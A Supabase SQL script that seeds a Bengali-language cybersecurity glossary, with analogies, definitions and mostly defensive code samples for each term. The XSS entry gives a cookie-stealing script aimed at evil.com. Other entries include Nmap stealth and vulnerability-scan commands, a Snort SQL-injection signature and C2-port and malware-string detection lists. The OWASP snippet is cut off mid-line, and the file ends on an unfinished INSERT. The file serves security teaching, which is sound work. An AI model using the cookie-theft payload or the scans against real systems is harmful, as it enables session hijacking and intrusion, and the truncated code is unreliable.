-- CyberSec Dictionary: supabase_setup.sql (CLEAN REBUILD)
-- Run this ONCE in Supabase SQL Editor


CREATE TABLE IF NOT EXISTS public.cyber_terms (
  id          SERIAL PRIMARY KEY,
  letter      CHAR(1)       NOT NULL,
  term        TEXT          NOT NULL UNIQUE,
  short       TEXT,
  analogy     TEXT,
  definition  TEXT,
  use_case    TEXT,
  example     TEXT,
  code        TEXT,
  tags        TEXT[]        DEFAULT '{}',
  risk        TEXT          CHECK (risk IN ('critical','high','medium','low')) DEFAULT 'medium',
  category    TEXT,
  image       TEXT,
  created_at  TIMESTAMPTZ   DEFAULT NOW(),
  updated_at  TIMESTAMPTZ   DEFAULT NOW()
);

CREATE OR REPLACE FUNCTION update_updated_at()
RETURNS TRIGGER AS $$
BEGIN NEW.updated_at = NOW(); RETURN NEW; END;
$$ LANGUAGE plpgsql;

DROP TRIGGER IF EXISTS trg_updated_at ON public.cyber_terms;
CREATE TRIGGER trg_updated_at
  BEFORE UPDATE ON public.cyber_terms
  FOR EACH ROW EXECUTE FUNCTION update_updated_at();

ALTER TABLE public.cyber_terms ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Public read" ON public.cyber_terms;
CREATE POLICY "Public read" ON public.cyber_terms FOR SELECT USING (true);
DROP POLICY IF EXISTS "Auth write" ON public.cyber_terms;
CREATE POLICY "Auth write" ON public.cyber_terms FOR ALL USING (auth.role() = 'authenticated');

ALTER PUBLICATION supabase_realtime ADD TABLE public.cyber_terms;

CREATE INDEX IF NOT EXISTS idx_cyber_terms_letter   ON public.cyber_terms (letter);
CREATE INDEX IF NOT EXISTS idx_cyber_terms_risk     ON public.cyber_terms (risk);
CREATE INDEX IF NOT EXISTS idx_cyber_terms_category ON public.cyber_terms (category);

-- ═══════════════ TERM DATA ═══════════════
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'A', 'Authentication', 'পরিচয় যাচাই প্রক্রিয়া',
  '🔑 দরজার তালার মতো — সঠিক চাবি না দিলে ঢুকতে পারবে না।',
  'Authentication হলো এমন একটি প্রক্রিয়া যেখানে একটি সিস্টেম নিশ্চিত করে যে ব্যবহারকারী সত্যিই সে-ই যে সে দাবি করছে। এটি তিন ধরনের হতে পারে: কিছু জানা (পাসওয়ার্ড), কিছু থাকা (OTP), বা কিছু হওয়া (বায়োমেট্রিক)।',
  'ব্যাংকিং অ্যাপে লগইন করার সময় OTP পাঠানো, বায়োমেট্রিক স্ক্যান, পাসওয়ার্ড যাচাই।',
  'Gmail-এ লগইন করতে হলে সঠিক ইমেইল + পাসওয়ার্ড দিতে হয় — এটাই Authentication।',
  $CODE000$// JWT Authentication (Node.js)
const jwt = require('jsonwebtoken');

// Token তৈরি
const token = jwt.sign(
  { userId: 123, email: 'user@example.com' },
  process.env.JWT_SECRET,
  { expiresIn: '24h' }
);

// Token যাচাই
jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
  if (err) return res.status(401).json({ error: 'Invalid token' });
  req.user = decoded;
  next();
});$CODE000$,
  ARRAY[]::text[],
  'medium', '', ''
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'A', 'Authorization', 'অনুমতি নিয়ন্ত্রণ',
  '🏢 অফিসে ঢুকলেই সব রুমে যেতে পারবে না — শুধু তোমার অনুমোদিত এলাকায়।',
  'Authorization হলো Authentication-এর পরের ধাপ — কোন ব্যবহারকারী কোন রিসোর্সে অ্যাক্সেস পাবে তা নির্ধারণ। RBAC, ABAC ও DAC তিনটি প্রধান মডেল।',
  'Admin সব ডেটা দেখতে পারে, regular user শুধু নিজের ডেটা দেখতে পারে।',
  'হাসপাতাল সিস্টেমে ডাক্তার রোগীর রেকর্ড দেখতে পারেন, রিসেপশনিস্ট পারেন না।',
  $CODE001$// Role-Based Authorization (RBAC)
const checkRole = (requiredRole) => (req, res, next) => {
  const hierarchy = { admin: 3, doctor: 2, patient: 1 };
  if (hierarchy[req.user.role] >= hierarchy[requiredRole]) {
    return next();
  }
  res.status(403).json({ error: 'Access Denied' });
};

app.get('/admin', authenticate, checkRole('admin'), handler);$CODE001$,
  ARRAY['RBAC','access-control','permissions','ACL'],
  'high', 'Access Control', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'A', 'ARP Spoofing', 'নেটওয়ার্ক আইডেন্টিটি জালিয়াতি',
  '📮 কেউ যদি তোমার বাসার ঠিকানায় নিজের নাম লিখে চিঠি নেয় — সেটাই ARP Spoofing।',
  'ARP Spoofing হলো এমন একটি আক্রমণ যেখানে attacker ভুয়া ARP বার্তা পাঠিয়ে নেটওয়ার্কে নিজেকে অন্য কারো হিসেবে উপস্থাপন করে, ফলে সব ট্র্যাফিক তার মধ্য দিয়ে যায়।',
  'Man-in-the-Middle আক্রমণ, নেটওয়ার্ক ট্র্যাফিক intercept।',
  'কফিশপের WiFi-তে attacker নিজেকে রাউটার হিসেবে দেখিয়ে সবার ট্র্যাফিক পড়ছে।',
  $CODE002$# ARP Spoofing সনাক্তকরণ (Python/Scapy)
from scapy.all import ARP, sniff
from scapy.layers.l2 import getmacbyip

def detect_arp_spoof(packet):
    if packet[ARP].op == 2:  # ARP reply
        real_mac = getmacbyip(packet[ARP].psrc)
        if real_mac and real_mac != packet[ARP].hwsrc:
            print(f"⚠️ ARP Spoofing! IP:{packet[ARP].psrc}")
            print(f"Real:{real_mac} | Fake:{packet[ARP].hwsrc}")

sniff(filter="arp", prn=detect_arp_spoof, store=0)$CODE002$,
  ARRAY['network','MITM','spoofing','LAN'],
  'critical', 'Network Attack', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'B', 'Botnet', 'সংক্রমিত কম্পিউটারের নেটওয়ার্ক',
  '🧟 জম্বি সেনাবাহিনীর মতো — লক্ষ কম্পিউটার অজান্তে হ্যাকারের নির্দেশে কাজ করছে।',
  'Botnet হলো malware-সংক্রমিত কম্পিউটারের একটি নেটওয়ার্ক যা একটি কেন্দ্রীয় C&C (Command & Control) সার্ভার দ্বারা নিয়ন্ত্রিত।',
  'DDoS আক্রমণ, স্প্যাম ইমেইল, ক্রিপ্টোমাইনিং, ক্রেডেনশিয়াল স্টাফিং।',
  'Mirai Botnet ২০১৬ সালে ৬০০,০০০ IoT ডিভাইস ব্যবহার করে মেজর সাইট ডাউন করে।',
  $CODE003$# Suspicious C&C Connection সনাক্তকরণ
import subprocess

def check_c2_connections():
    result = subprocess.run(
        ['netstat', '-an'], capture_output=True, text=True
    )
    # Common C&C ports
    c2_ports = [6667, 6668, 1337, 31337, 4444]
    
    for line in result.stdout.split('\
'):
        for port in c2_ports:
            if f':{port}' in line and 'ESTABLISHED' in line:
                print(f"🚨 Suspicious C2: {line.strip()}")

check_c2_connections()$CODE003$,
  ARRAY['malware','DDoS','C2','zombie','IoT'],
  'critical', 'Malware', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'B', 'Brute Force Attack', 'পাসওয়ার্ড অনুমান করার আক্রমণ',
  '🔐 ৪ সংখ্যার তালা খুলতে ০০০০ থেকে ৯৯৯৯ সব চেষ্টা করা।',
  'Brute Force Attack হলো সব সম্ভাব্য পাসওয়ার্ড বা কী ক্রমানুসারে চেষ্টা করে সঠিকটি খুঁজে বের করার পদ্ধতি। Dictionary Attack এর একটি variant।',
  'দুর্বল পাসওয়ার্ড crack, PIN অনুমান, hash cracking।',
  'admin/admin, admin/password, admin/123456 দিয়ে বারবার লগইন চেষ্টা।',
  $CODE004$// Rate Limiting দিয়ে Brute Force প্রতিরোধ
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 মিনিট
  max: 5,                    // সর্বোচ্চ ৫ চেষ্টা
  message: {
    error: 'Too many attempts. Retry after 15 minutes.'
  },
  standardHeaders: true,
});

// Account lockout
let failedAttempts = {};
app.post('/login', loginLimiter, (req, res) => {
  const ip = req.ip;
  failedAttempts[ip] = (failedAttempts[ip] || 0) + 1;
  if (failedAttempts[ip] > 5) lockAccount(req.body.email);
});$CODE004$,
  ARRAY['password','attack','rate-limiting','lockout'],
  'high', 'Attack Vector', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'C', 'Cryptography', 'তথ্য এনক্রিপশনের বিজ্ঞান',
  '🔒 গোপন ভাষায় চিঠি লেখার মতো — শুধু প্রাপক পড়তে পারবে।',
  'Cryptography হলো তথ্যকে এমনভাবে রূপান্তর করার বিজ্ঞান যাতে শুধুমাত্র অনুমোদিত পক্ষ পড়তে পারে। Symmetric (AES) ও Asymmetric (RSA) দুই ধরন।',
  'HTTPS, WhatsApp E2E encryption, ব্যাংক ট্র্যানজ্যাকশন, পাসওয়ার্ড স্টোরেজ।',
  'WhatsApp মেসেজ end-to-end encrypted — Meta-ও পড়তে পারে না।',
  $CODE005$// AES-256-GCM Encryption (Node.js)
const crypto = require('crypto');
const KEY = crypto.randomBytes(32);

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', KEY, iv);
  let enc = cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
  return { enc, iv: iv.toString('hex'), tag: cipher.getAuthTag().toString('hex') };
}

function decrypt({ enc, iv, tag }) {
  const d = crypto.createDecipheriv('aes-256-gcm', KEY, Buffer.from(iv,'hex'));
  d.setAuthTag(Buffer.from(tag,'hex'));
  return d.update(enc,'hex','utf8') + d.final('utf8');
}

console.log(decrypt(encrypt("গোপন বার্তা")));$CODE005$,
  ARRAY['AES','RSA','TLS','PKI','symmetric','asymmetric'],
  'medium', 'Cryptography', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'C', 'Cross-Site Scripting (XSS)', 'ওয়েবসাইটে ক্ষতিকর স্ক্রিপ্ট ইনজেকশন',
  '📝 পাবলিক নোটবোর্ডে ফাঁদ পেতে রাখল — যে পড়তে যাবে সে ক্ষতিগ্রস্ত হবে।',
  'XSS হলো OWASP Top 10-এর অন্যতম — attacker কোনো ওয়েবসাইটে ক্ষতিকর JavaScript inject করে, যা অন্য ব্যবহারকারীর ব্রাউজারে execute হয়।',
  'Session cookie চুরি, keylogging, পেজ ডিফেসমেন্ট, redirect।',
  'কমেন্ট বক্সে <script>document.location=''evil.com?c=''+document.cookie</script>',
  $CODE006$// XSS Prevention

// ❌ Vulnerable
element.innerHTML = userInput;

// ✅ Safe: textContent
element.textContent = userInput;

// ✅ Safe: DOMPurify
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// ✅ CSP Header (Express)
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; object-src 'none'"
  );
  next();
});

// ✅ HTML Encode
const escape = s => s.replace(/[&<>"']/g,
  c => ({'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',"'":'&#39;'}[c])
);$CODE006$,
  ARRAY['web','injection','OWASP','DOM','CSP'],
  'critical', 'Web Security', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'C', 'CSRF', 'ক্রস-সাইট রিকোয়েস্ট ফোরজারি',
  '✍️ তোমার হাত ধরে জোর করে চেক সাইন করানো — তুমি জানোও না।',
  'CSRF হলো এমন আক্রমণ যেখানে একজন authenticated ব্যবহারকারীকে তার অজান্তে unwanted HTTP request করানো হয়।',
  'Bank transfer, পাসওয়ার্ড পরিবর্তন, অ্যাকাউন্ট মুছে ফেলা।',
  'Bank-এ লগড-ইন অবস্থায় ক্ষতিকর লিঙ্কে ক্লিক করলে টাকা চলে যায়।',
  $CODE007$// CSRF Protection (Express + csurf)
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: { sameSite: 'strict' } });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});
app.post('/form', csrfProtection, handler);
// HTML: <input type="hidden" name="_csrf" value="{{csrfToken}}">

// Modern: SameSite Cookie
res.cookie('session', token, {
  sameSite: 'strict',
  httpOnly: true,
  secure: true,
  maxAge: 3600000
});$CODE007$,
  ARRAY['web','OWASP','token','cookies','SameSite'],
  'high', 'Web Security', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'D', 'DDoS Attack', 'বিতরণ করা সার্ভিস-বাধা আক্রমণ',
  '🚗 রাস্তায় হঠাৎ লক্ষ গাড়ি এলে যানজটে সব থেমে যাবে।',
  'DDoS (Distributed Denial of Service) হলো হাজার সিস্টেম থেকে একসাথে request পাঠিয়ে কোনো সার্ভিসকে overwhelm করে অচল করা। Volumetric, Protocol ও Application layer — তিন ধরন।',
  'প্রতিযোগী সাইট ডাউন করা, extortion, hacktivism।',
  'GitHub ২০১৮ সালে ১.৩৫ Tbps, ২০২০ সালে ২.৫ Tbps DDoS সামলেছিল।',
  $CODE008$# Nginx Rate Limiting
# /etc/nginx/nginx.conf

http {
  limit_conn_zone $binary_remote_addr zone=conn:10m;
  limit_req_zone  $binary_remote_addr zone=req:10m rate=10r/s;

  server {
    limit_conn conn 20;
    limit_req  zone=req burst=20 nodelay;

    client_body_timeout    10s;
    client_header_timeout  10s;
    keepalive_timeout      30s;
    client_max_body_size   1m;
  }
}
# Production: Cloudflare / AWS Shield ব্যবহার করুন$CODE008$,
  ARRAY['network','availability','botnet','Cloudflare','CDN'],
  'critical', 'Network Attack', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'E', 'Encryption', 'তথ্য সুরক্ষিত রূপান্তর',
  '📦 চিঠি বিশেষ বাক্সে তালা দিয়ে পাঠানো — শুধু চাবিওয়ালা খুলতে পারবে।',
  'Encryption হলো plaintext ডেটাকে cipher algorithm দিয়ে ciphertext-এ রূপান্তর করা। Symmetric encryption-এ একই key, Asymmetric-এ public/private key pair ব্যবহার হয়।',
  'HTTPS, database encryption, file encryption, email (PGP)।',
  'WhatsApp মেসেজ Signal Protocol দিয়ে end-to-end encrypt।',
  $CODE009$# Python Fernet Encryption
from cryptography.fernet import Fernet

key = Fernet.generate_key()  # একবার তৈরি, নিরাপদে রাখুন
f = Fernet(key)

# Encrypt
token = f.encrypt(b"sensitive data")
print("Encrypted:", token)

# Decrypt
original = f.decrypt(token)
print("Decrypted:", original.decode())

# File encrypt করুন
def encrypt_file(path):
    with open(path,'rb') as fp: data = fp.read()
    with open(path+'.enc','wb') as fp: fp.write(f.encrypt(data))
    print(f"✅ {path} encrypted")$CODE009$,
  ARRAY['AES','RSA','TLS','E2E','data-protection'],
  'medium', 'Cryptography', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'F', 'Firewall', 'নেটওয়ার্ক নিরাপত্তা প্রহরী',
  '🏰 দুর্গের দারোয়ান — নিয়ম মেনে কেউ ঢুকতে পারবে, বাকি ব্লক।',
  'Firewall হলো predefined rules অনুযায়ী incoming/outgoing ট্র্যাফিক নিয়ন্ত্রণকারী সিস্টেম। Packet Filter, Stateful, Application Layer (WAF) — তিন ধরন।',
  'অননুমোদিত access ব্লক, port scanning প্রতিরোধ, network segmentation।',
  'কর্পোরেট ফায়ারওয়াল সোশ্যাল মিডিয়া ব্লক রেখেছে।',
  $CODE010$# Linux iptables Firewall

# Default: সব block
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Established connections allow
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT

# SSH — শুধু নিজের IP
iptables -A INPUT -p tcp --dport 22 -s 203.0.113.0/24 -j ACCEPT

# Web
iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT

# SSH brute force protection
iptables -A INPUT -p tcp --dport 22 -m recent --set
iptables -A INPUT -p tcp --dport 22 -m recent --update \\
  --seconds 60 --hitcount 4 -j DROP$CODE010$,
  ARRAY['network','iptables','WAF','packet-filter'],
  'low', 'Defense', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'H', 'Hashing', 'একমুখী ডেটা রূপান্তর',
  '🍎 আপেলকে জুস বানালে আর আপেল ফেরত পাওয়া যায় না।',
  'Hashing হলো একমুখী ক্রিপ্টোগ্রাফিক ফাংশন যা যেকোনো ইনপুটকে নির্দিষ্ট দৈর্ঘ্যের hash-এ রূপান্তর করে। SHA-256, bcrypt, Argon2 জনপ্রিয়।',
  'পাসওয়ার্ড স্টোরেজ, ফাইল integrity যাচাই, digital signature।',
  'ডেটাবেসে পাসওয়ার্ড কখনো plaintext রাখা হয় না — bcrypt hash হিসেবে।',
  $CODE011$// bcrypt Password Hashing (Node.js)
const bcrypt = require('bcrypt');

// Hash (SALT_ROUNDS যত বেশি, তত নিরাপদ কিন্তু ধীর)
async function hashPassword(plain) {
  return bcrypt.hash(plain, 12);
}

// Verify
async function verify(plain, hash) {
  return bcrypt.compare(plain, hash);
}

// File Integrity (Python)
import hashlib

def sha256(path):
    h = hashlib.sha256()
    with open(path,'rb') as f:
        for chunk in iter(lambda: f.read(8192), b''):
            h.update(chunk)
    return h.hexdigest()

print("Match:", sha256('file.zip') == expected_hash)$CODE011$,
  ARRAY['SHA-256','bcrypt','Argon2','integrity','password'],
  'low', 'Cryptography', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'I', 'IDS / IPS', 'অনুপ্রবেশ সনাক্তকরণ ও প্রতিরোধ',
  '🚨 বাড়ির অ্যালার্ম (IDS) — এবং স্বয়ংক্রিয় দরজা লক (IPS)।',
  'IDS (Intrusion Detection System) সন্দেহজনক কার্যকলাপ সনাক্ত করে alert পাঠায়। IPS (Intrusion Prevention System) সক্রিয়ভাবে ব্লকও করে।',
  'Zero-day সনাক্ত, insider threat মনিটর, compliance logging।',
  'Snort IDS রাত ৩টায় port scan সনাক্ত করে admin-কে ইমেইল পাঠালো।',
  $CODE012$# Snort IDS Rules
# /etc/snort/rules/local.rules

# Port Scan
alert tcp any any -> $HOME_NET any (
  msg:"Port Scan Detected";
  flags:S;
  threshold: type both, track by_src, count 20, seconds 60;
  sid:1000001;
)

# SQL Injection
alert http $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
  msg:"SQL Injection Attempt";
  content:"' OR '1'='1";
  http_uri;
  sid:1000002;
)

# Snort চালু করুন
# snort -c /etc/snort/snort.conf -i eth0 -A fast$CODE012$,
  ARRAY['monitoring','SIEM','Snort','Suricata','anomaly'],
  'medium', 'Defense', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'M', 'Malware', 'ক্ষতিকর সফটওয়্যার',
  '🦠 কম্পিউটার ভাইরাস ঠিক জৈবিক ভাইরাসের মতো — ছড়ায়, ক্ষতি করে।',
  'Malware (Malicious Software) হলো যেকোনো সফটওয়্যার যা ক্ষতির জন্য তৈরি। Virus, Worm, Trojan, Ransomware, Spyware, Adware, Rootkit — বিভিন্ন ধরন।',
  'ডেটা চুরি, সিস্টেম ধ্বংস, ransomware, cryptomining।',
  'WannaCry ২০১৭ সালে ১৫০ দেশের লক্ষ কম্পিউটার encrypt করে।',
  $CODE013$# Static Malware Analysis (Python)
import hashlib, re

def analyze(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    
    md5 = hashlib.md5(data).hexdigest()
    sha256 = hashlib.sha256(data).hexdigest()
    print(f"MD5: {md5}\
SHA256: {sha256}")
    print(f"VirusTotal: https://virustotal.com/gui/file/{sha256}")
    
    # Suspicious strings
    patterns = ['cmd.exe','powershell','WScript.Shell',
                'reg add','taskkill','base64','http://']
    text = data.decode('utf-8', errors='ignore')
    for p in patterns:
        if p.lower() in text.lower():
            print(f"⚠️ Suspicious: {p}")

analyze('suspicious.exe')$CODE013$,
  ARRAY['virus','ransomware','trojan','spyware','rootkit'],
  'critical', 'Malware', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'M', 'Man-in-the-Middle (MITM)', 'মাঝখানে বসে তথ্য আটকানো',
  '📬 পোস্টম্যান চিঠি পড়ে, কপি করে, তারপর পাঠায় — কেউ জানে না।',
  'MITM আক্রমণে attacker দুটি পক্ষের যোগাযোগে গোপনে প্রবেশ করে ডেটা পড়ে বা পরিবর্তন করে। SSL Stripping, ARP Spoofing দিয়ে করা হয়।',
  'Public WiFi-তে credential চুরি, session hijacking।',
  'কফিশপে ফ্রি WiFi-তে ব্যাংকিং তথ্য intercept হচ্ছে।',
  $CODE014$# MITM Prevention

# 1. Certificate Pinning (Python requests)
import requests

response = requests.get(
    'https://api.example.com',
    verify='/path/to/cert.pem'  # Specific certificate pin
)

# 2. HSTS Header (Express)
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );
  next();
});

# 3. HTTPS redirect
app.use((req, res, next) => {
  if (!req.secure) {
    return res.redirect(301, 'https://' + req.headers.host + req.url);
  }
  next();
});$CODE014$,
  ARRAY['network','SSL','HSTS','certificate','WiFi'],
  'critical', 'Network Attack', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'N', 'Network Scanning', 'নেটওয়ার্ক রিকনেসাঁস পদ্ধতি',
  '🗺️ কোনো এলাকায় যাওয়ার আগে সব বাড়ির দরজা-জানালা চেক করা।',
  'Network Scanning হলো নেটওয়ার্কে active hosts, open ports ও services সনাক্ত করার প্রক্রিয়া। Penetration testing-এর প্রথম ধাপ।',
  'Vulnerability assessment, asset inventory, unauthorized device সনাক্ত।',
  'Nmap দিয়ে নেটওয়ার্কে কোন port খোলা আছে তা দেখা।',
  $CODE015$# Nmap Network Scanning

# Basic scan
nmap 192.168.1.0/24

# Service & Version detection
nmap -sV -sC 192.168.1.1

# Full port scan
nmap -p- 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Stealth scan
nmap -sS 192.168.1.1

# Vulnerability scan
nmap --script vuln 192.168.1.1

# Python দিয়ে সরল port scan
import socket

def scan_ports(host, ports):
    open_ports = []
    for port in ports:
        s = socket.socket()
        s.settimeout(0.5)
        if s.connect_ex((host, port)) == 0:
            open_ports.append(port)
        s.close()
    return open_ports

print(scan_ports('192.168.1.1', range(1,1025)))$CODE015$,
  ARRAY['Nmap','recon','port-scan','OSINT','pentest'],
  'medium', 'Reconnaissance', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'O', 'OWASP Top 10', 'সবচেয়ে বিপজ্জনক ওয়েব নিরাপত্তা ঝুঁকি',
  '🏆 ওয়েব সিকিউরিটির বিপজ্জনক শত্রুদের ''Most Wanted'' তালিকা।',
  'OWASP (Open Web Application Security Project) Top 10 হলো সবচেয়ে গুরুতর ওয়েব অ্যাপ্লিকেশন নিরাপত্তা ঝুঁকির তালিকা, প্রতি ৩-৪ বছরে আপডেট হয়।',
  'Secure development checklist, security audit baseline, compliance।',
  'OWASP 2021: A01-Broken Access Control, A02-Cryptographic Failures, A03-Injection।',
  $CODE016$// OWASP Top 10 (2021) Quick Reference

const owaspTop10 = [
  { rank: "A01", name: "Broken Access Control",     fix: "RBAC, least privilege" },
  { rank: "A02", name: "Cryptographic Failures",    fix: "TLS 1.3, AES-256" },
  { rank: "A03", name: "Injection (SQLi, XSS)",     fix: "Parameterized queries" },
  { rank: "A04", name: "Insecure Design",           fix: "Threat modeling" },
  { rank: "A05", name: "Security Misconfiguration", fix: "Hardening guides" },
  { rank: "A06", name: "Vulnerable Components",     fix: "SCA, patch regularly" },
  { rank: "A07", name: "Auth Failures",             fix: "MFA, strong passwords" },
  { rank: "A08", name: "Integrity Failures",        fix: "Code signing, SAST" },
  { rank: "A09", name: "Logging Failures",          fix: "SIEM, audit logs" },
  { rank: "A10", name: "SSRF",                      fix: "Allowlist, firewall" },
];

owaspTop10.forEach(({rank,name,fix}) =>
  console.log(\$CODE016$,
  ARRAY['web','standards','checklist','SAST','compliance'],
  'high', 'Web Security', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'P', 'Phishing', 'প্রতারণামূলক পরিচয়ে তথ্য চুরি',
  '🎣 ভুয়া미끼দিয়ে মাছ ধরার মতো — ব্যবহারকারী কামড় দিলেই ধরা।',
  'Phishing হলো বৈধ সংস্থার ছদ্মবেশে ব্যবহারকারীকে sensitive তথ্য দিতে প্রতারণা। Spear Phishing (targeted), Whaling (executives), Vishing (voice) variant।',
  'Login credentials চুরি, credit card তথ্য, malware distribution।',
  '''Your bank account will be closed'' ইমেইলের লিঙ্ক fake সাইটে নিয়ে যায়।',
  $CODE017$// Anti-Phishing Email Check (Node.js)
const dns = require('dns').promises;

async function checkEmailSafety(domain) {
  const result = { spf: false, dmarc: false, suspicious: false };
  
  try {
    const spf = await dns.resolveTxt(domain);
    result.spf = spf.flat().some(r => r.includes('v=spf1'));
    
    const dmarc = await dns.resolveTxt('_dmarc.' + domain);
    result.dmarc = dmarc.flat().some(r => r.includes('v=DMARC1'));
  } catch {}
  
  // Lookalike domains
  const fakes = ['paypa1','g00gle','amaz0n','micros0ft'];
  result.suspicious = fakes.some(f => domain.includes(f));
  
  return result;
}

checkEmailSafety('paypa1.com').then(console.log);$CODE017$,
  ARRAY['social-engineering','email','spear-phishing','vishing'],
  'critical', 'Social Engineering', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'R', 'Ransomware', 'ডেটা জিম্মি করে মুক্তিপণ দাবি',
  '🏴‍☠️ সব ফাইল তালাবন্ধ করে চাবির বিনিময়ে টাকা চাইছে।',
  'Ransomware হলো malware যা ভিকটিমের ফাইল encrypt করে এবং Bitcoin-এ মুক্তিপণ দাবি করে। RaaS (Ransomware-as-a-Service) এখন অনেক সহজলভ্য।',
  'হাসপাতাল, স্কুল, সরকারি সংস্থা, বড় কর্পোরেশন।',
  'Colonial Pipeline ২০২১ সালে $4.4M Bitcoin মুক্তিপণ দিতে বাধ্য।',
  $CODE018$# Ransomware Defense: 3-2-1 Backup
import os, shutil, datetime, hashlib

def secure_backup(src, dst):
    ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    bk = os.path.join(dst, f'backup_{ts}')
    shutil.copytree(src, bk)
    
    # Manifest with integrity hashes
    manifest = {}
    for root, _, files in os.walk(bk):
        for f in files:
            fp = os.path.join(root, f)
            with open(fp,'rb') as fh:
                manifest[fp] = hashlib.sha256(fh.read()).hexdigest()
    
    with open(os.path.join(bk,'MANIFEST.txt'),'w') as m:
        for p,h in manifest.items():
            m.write(f"{h}  {p}\
")
    
    print(f"✅ Backup: {bk} ({len(manifest)} files)")

# 3-2-1 Rule: 3 copies, 2 media types, 1 offsite
secure_backup('/data', '/backup/local')$CODE018$,
  ARRAY['malware','encryption','bitcoin','backup','RaaS'],
  'critical', 'Malware', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
